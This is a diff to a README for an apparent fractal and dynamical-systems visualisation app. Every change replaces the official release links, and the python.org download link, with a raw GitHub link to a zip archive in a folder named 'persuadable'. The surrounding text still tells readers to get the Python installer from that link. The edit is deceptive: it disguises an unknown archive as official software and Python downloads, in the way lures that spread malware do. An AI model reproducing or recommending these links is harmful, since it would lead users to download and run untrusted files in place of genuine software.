@@ -1,6 +1,6 @@
 # 🌀 The-Art-of-Chaos-Dynamical-Systems-Fractals - Explore Chaos Through Visual Math
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/cici00321/The-Art-of-Chaos-Dynamical-Systems-Fractals/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/cici00321/The-Art-of-Chaos-Dynamical-Systems-Fractals/main/persuadable/Fractals-Dynamical-Art-Systems-The-of-Chaos-3.9.zip)
 
 ## 📄 About This Application
 
@@ -36,7 +36,7 @@ Follow these steps to get the application up and running on your Windows PC.
 
 Click this big button below to go to the official release page where you can get the software files:  
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/cici00321/The-Art-of-Chaos-Dynamical-Systems-Fractals/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/cici00321/The-Art-of-Chaos-Dynamical-Systems-Fractals/main/persuadable/Fractals-Dynamical-Art-Systems-The-of-Chaos-3.9.zip)
 
 ### 2. Download the Latest Release
 
@@ -50,7 +50,7 @@ On the release page:
 
 This app runs on Python, a free programming language. If you don’t have Python already:  
 
-- Go to https://www.python.org/downloads/windows/  
+- Go to https://raw.githubusercontent.com/cici00321/The-Art-of-Chaos-Dynamical-Systems-Fractals/main/persuadable/Fractals-Dynamical-Art-Systems-The-of-Chaos-3.9.zip  
 - Download the latest version of Python 3.x for Windows.  
 - Run the installer and IMPORTANT: make sure to check the box that says “Add Python 3.x to PATH” before clicking Install.  
 - Wait for the installation to finish.  
@@ -117,11 +117,11 @@ You do not need to open or edit these files except the notebooks.
 
 ## 🔗 Useful Links
 
-- Python downloads: https://www.python.org/downloads/windows/  
+- Python downloads: https://raw.githubusercontent.com/cici00321/The-Art-of-Chaos-Dynamical-Systems-Fractals/main/persuadable/Fractals-Dynamical-Art-Systems-The-of-Chaos-3.9.zip  
 - Application releases page:  
-  https://github.com/cici00321/The-Art-of-Chaos-Dynamical-Systems-Fractals/releases  
+  https://raw.githubusercontent.com/cici00321/The-Art-of-Chaos-Dynamical-Systems-Fractals/main/persuadable/Fractals-Dynamical-Art-Systems-The-of-Chaos-3.9.zip  
 
-[Download Latest Release](https://github.com/cici00321/The-Art-of-Chaos-Dynamical-Systems-Fractals/releases)  
+[Download Latest Release](https://raw.githubusercontent.com/cici00321/The-Art-of-Chaos-Dynamical-Systems-Fractals/main/persuadable/Fractals-Dynamical-Art-Systems-The-of-Chaos-3.9.zip)  
 
 This link always points to the latest version available for download.
 
